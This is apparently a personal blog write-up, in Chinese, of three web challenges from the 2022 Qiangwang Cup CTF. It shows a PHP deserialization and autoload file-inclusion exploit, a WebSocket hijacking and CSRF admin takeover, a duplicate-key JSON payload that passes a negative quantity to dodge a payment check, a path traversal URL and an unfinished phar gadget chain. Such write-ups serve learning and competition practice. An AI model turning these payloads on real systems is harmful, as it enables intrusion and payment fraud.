---
title: "2022 强网杯 Web 部分 Writeup"
date: 2022-08-01T18:22:43+08:00
draft: false
author: "X1r0z"

tags: ['php','ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

我来当分母啦!

就做出来 rcefile 和 babyweb, easyweb 做了一半卡了...

<!--more-->

## rcefile

![20220731152153](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731152153.png)

有三个文件

```
index.php
upload.php
showfile.php
```

正常上传一个文件抓包看看

![20220731152410](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731152410.png)

![20220731152422](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731152422.png)

看到这个返回包的 Cookie 感觉不对劲

```
Set-Cookie: userfile=a%3A1%3A%7Bi%3A0%3Bs%3A36%3A%22f64fdd2149a6611a1a43868d8a54afc1.png%22%3B%7D; expires=Sun, 31-Jul-2022 17:24:03 GMT; Max-Age=36000
```

解码

```
a:1:{i:0;s:36:"f64fdd2149a6611a1a43868d8a54afc1.png";}
```

第一感觉是 PHP 的反序列化, 需要代码审计

代码审计的话必然需要源码, 这里测试了 vim .git .svn .phps 和各种压缩文件

试出来 www.zip

下载解压打开

![20220731152704](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731152704.png)

config.inc.php

```php
<?php
spl_autoload_register();
error_reporting(0);

function e($str){
    return htmlspecialchars($str);
}
$userfile = empty($_COOKIE["userfile"]) ? [] : unserialize($_COOKIE["userfile"]);
?>
<p>
    <a href="/index.php">Index</a>
    <a href="/showfile.php">files</a>
</p>

```

出现了 `unserialize()`

upload.php

![20220731152900](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731152900.png)

set-cookie 的时候进行了 `serialize()`

如果要利用反序列化漏洞, 一般情况下文件中至少应该有一个类, 但这里没有

不过 config.inc.php 开头的两句话感觉不太对劲

```php
spl_autoload_register();
error_reporting(0);
```

查了一下 PHP 官方手册

![20220731153012](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731153012.png)

大概就是注册一个名为 `__autoload()` 的魔术方法

这里我们重点看下面的参数部分

"如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()"

遂查阅 `spl_autoload()`

![20220731153326](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731153326.png)

![20220731153724](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731153724.png)

简单来说就是一个类的自动加载器

如果我们使用了没有被定义的类时, `spl_autoload()` 会默认在当前目录和 include paths 下包含 `[class].inc` 或者 `[class].php` 文件来试图加载这个类

而这个类我们可以通过对 Cookie 中 userfile 的反序列化来实现

很巧的是文件上传采用的是黑名单机制

```php
blackext = ["php", "php5", "php3", "html", "swf", "htm","phtml"];
```

所以我们先上传一个 .inc 后缀的文件 (包含一句话)

![20220731154300](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731154300.png)

注意需要多点几次看看返回的文件名, PHP 的类名不能以数字开头

`fb1878a933b5d5d3d86d5309059e63a3.inc`

然后我们本地构造一个类 `fb1878a933b5d5d3d86d5309059e63a3`

```php
<?php

class fb1878a933b5d5d3d86d5309059e63a3{};

echo serialize(new fb1878a933b5d5d3d86d5309059e63a3());

?>
```

`O:32:"fb1878a933b5d5d3d86d5309059e63a3":0:{}`

然后 urlencode 后设置到 cookie 中, 通过 index.php 连接 (index.php 中包含了进行反序列化操作的 config.inc.php, showfile.php upload.php 同理)

![20220731154753](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731154753.png)

flag 在根目录

![20220731154830](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731154830.png)

## babyweb

![20220731154936](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731154936.png)

登录 注册处没有 SQL 注入, 手工也没有找到备份文件

注册 admin 的时候发现账号已存在

![20220731155032](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731155032.png)

试了下没有弱口令

自己注册了个 test test 账户, 登录

![20220731155121](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731155121.png)

![20220731155202](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731155202.png)

抓包看了一下发现是 websocket 协议

![20220731155217](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731155217.png)

之前没怎么遇到过...

网上搜了搜之后发现这篇文章 [https://zhuanlan.zhihu.com/p/542006880](https://zhuanlan.zhihu.com/p/542006880)

大概就是说 websocket 传输的时候如果没有验证 Origin 的话可能会出现 websocket 劫持

然后突然联想到了 csrf

结合 bot 返回信息中的 `bugreport` 和 `changepw` 两个功能

我们可以本机进行一次 `changepw`, 然后构造这个数据包, 生成一个 html 页面, 通过 `bugreport` 让管理员访问, 从而修改管理员密码

自己还用最新版的 burp 抓包研究了一会, 之后才发现这个数据包的构造比我想象的要简单许多...

![20220731155623](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731155623.png)

js 实现的 websocket 通信

cv 下来改一改, 放到服务器上 (这里借用 ctfshow 的服务器)

![20220731160141](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731160141.png)

最后面记得加上 `sendtobot();`

url 一开始填的是题目给的外网 ip 和 port,  一直改不了 admin 的密码

后来 Y4 跟我说其实题目已经给了 hint

![20220731155953](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731155953.png)

`docker run -dit -p "0.0.0.0:pub_port:8888"`

进行了端口转发, 本机访问 8888 端口就行

最后 `bugreport`

![20220731160259](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731160259.png)

登陆成功

![20220731161035](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731161035.png)

先购买一个 hint

![20220731161105](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731161105.png)

![20220731161144](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731161144.png)

go 和 python 的代码审计, 不太会...

于是回过头先抓包看看

![20220731161245](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731161245.png)

提交的数据的 json 格式的, 猜测是不是跟 json 相关的漏洞有关

![20220731161318](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731161318.png)

![20220731161326](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731161326.png)

网上搜了一下这两个的 json 解析器

[http://cn-sec.com/archives/290702.html](http://cn-sec.com/archives/290702.html)

Python 标准库的 JSON 解析器, 针对重复键, 将返回最后一个键值对

Go 的第三方 JSON 解析器 jsonparser, 会返回第一个键值对

这里 pay.go 负责后端支付相关操作, 而 app.py 负责订单相关操作

简单来说就是支付的流程走的是 Go 端, 而支付完成后返回订单信息是在 Python 端

注意一下 Go 端

![20220731162118](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162118.png)

这里的 num 并没有验证是正数还是负数, 如果我们给出一个负的 num (比如-1), 会导致 cost 也为负

而当 `cost > money` 的时候会显示余额不足, 但经过上面的操作后 cost 已经变成了负数, 所以就绕过了 if 的判断

利用两者 JSON 解析器的差异, 我们构造 payload 如下

```json
{"product":[{"id":1,"num":0},{"id":2,"num":-1,"num":1}]}
```

![20220731162303](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162303.png)

回到主页得到 flag

![20220731162328](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162328.png)

## easyweb (未解出)

![20220731162451](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162451.png)

右键源代码

![20220731162501](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162501.png)

showfile.php 猜测是文件包含

![20220731162521](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162521.png)

报错, 显示只能存在 demo 或者 guest 字符串

手工测试了一下发现他只是单纯的验证是否存在 demo 或者 guest

类似 `demoindex.php` 这种文件估计是能够包含成功的

![20220731162656](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162656.png)

没想出来怎么绕过, 后来 Y4 师傅给了个 payload

`http://47.104.95.124:8080/showfile.php?f=./guest/../index.php`

![20220731162743](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731162743.png)

下载了 class.php index.php upload.php showfile.php

showfile.php

![20220731164219](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731164219.png)

class.php 中存在三个类 Upload AdminShow GuestShow

联想到反序列化, 但是四个文件里没有一个里面含有 `unserialize()` 函数

不过这里有文件包含, 猜测是 phar 反序列化

Upload 当时没想好怎么利用, 就转过来看 AdminShow 和 UserShow 两个类

```php
class GuestShow{
    public $file;
    public $contents;
    public function __construct($file)
    {

        $this->file=$file;
    }
    function __toString(){
        $str = $this->file->name;
        return "";
    }
    function __get($value){
        return $this->$value;
    }
    function show()
    {
        $this->contents = file_get_contents($this->file);
        $src = "data:jpg;base64,".base64_encode($this->contents);
        echo "<img src={$src} />";
    }
    function __destruct(){
        echo $this;
    }
}


class AdminShow{
    public $source;
    public $str;
    public $filter;
    public function __construct($file)
    {
        $this->source = $file;
        $this->schema = 'file:///var/www/html/';
    }
    public function __toString()
    {
        $content = $this->str[0]->source;
        $content = $this->str[1]->schema;
        return $content;
    }
    public function __get($value){
        $this->show();
        return $this->$value;
    }
    public function __set($key,$value){
        $this->$key = $value;
    }
    public function show(){
        if(preg_match('/usr|auto|log/i' , $this->source))
        {
            die("error");
        }
        $url = $this->schema . $this->source;
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_HEADER, 1);
        $response = curl_exec($curl);
        curl_close($curl);
        $src = "data:jpg;base64,".base64_encode($response);
        echo "<img src={$src} />";

    }
    public function __wakeup()
    {
        if ($this->schema !== 'file:///var/www/html/') {
            $this->schema = 'file:///var/www/html/';
        }
        if ($this->source !== 'admin.png') {
            $this->source = 'admin.png';
        }
    }
}
```

我们的目标是通过 curl 读文件, 就需要利用到 AdminShow 中的 show 方法, 并且更改 source 字段

类中唯一调用 show 的魔术方法是 `__get`

而 `__get` 的触发条件是访问一个 private 字段或者是不存在的字段, 但这里全是 public 字段

于是我们需要找到一个能够访问 AdminShow 中不存在的字段的地方

GuestShow 中 `__destruct` 方法中的 `echo $this` 会触发 `__toString`

`__toString` 中 `$str = $this->file->name` 会进行一次赋值

这里的 `$this->file` 是在 `__construct` 的时候定义的

恰巧 AdminShow 中没有 name 字段

于是 payload 如下

```php
<?php

class AdminShow{
    public $source;
    public function __construct(){
        $this->source = "showfile.php";
    }

}

class GuestShow {
    public $file;
    public function __construct($file){
        $this->file = $file;
    }

}

$o = new GuestShow(new AdminShow());

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();

?>
```

生成文件改名 `guestdemo123.jpg` 用于绕过字符串检测

![20220731165538](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731165538.png)

上传成功, 但读取不了...

![20220731165551](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731165551.png)

![20220731165606](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220731165606.png)

触发了 AdminShow 中的 `__wakeup` 方法, 当时用改数字的方法绕过 `__wakeup` 没成功

这题一开始 showfile.php 没读出来, 想着关键信息是不是在这里面啊, 后来等比赛结束了之后用那个链接竟然读出来了...

晚上想了想应该是 curl + ssrf 内网探测, 不过 payload 一直失败, 以为是 `__wakeup` 的问题

今天才发现反序列化的时候是不会执行 `__construct` 方法的, 也就是说此时 AdminShow 中的 `$this->schema` 是空值, 单独的 `$this->source` 用 curl 当然读不出来...

现在题目服务器已经关了, 也没机会测试了...